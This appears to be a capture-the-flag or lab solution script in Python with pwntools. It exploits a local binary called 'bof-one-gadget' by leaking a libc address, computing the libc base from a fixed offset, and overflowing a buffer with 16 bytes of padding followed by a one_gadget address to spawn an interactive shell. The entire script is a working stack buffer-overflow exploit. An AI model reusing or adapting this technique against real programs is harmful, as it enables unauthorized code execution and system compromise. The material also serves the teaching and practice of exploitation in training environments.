from pwn import *
import pwnlib.shellcraft as shellcraft

libc_file = "../libc.so.6.md5.5898fac5d2680d0d8fefdadd632b7188"
c = process("./bof-one-gadget", env={'LD_PRELOAD': libc_file})

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']
#gdb.attach(c)


one_gadget = 0xe3b01
c.recvuntil("Dump")

# drop 9 lines
for i in range(9):
    print("drop", c.recvline())

"""
p 0x7f68fcb21083-0x00007f68fcafd000
$1 = 0x24083
"""

addr = c.recvline().split()[-1]
libc_addr = int(addr, 16) - 0x24083
print(hex(libc_addr))

c.recvuntil("End")

# one gadget
payload = 0x10 * b'A' + p64(one_gadget + libc_addr)
c.sendlineafter(":", payload)

c.interactive()
c.close()
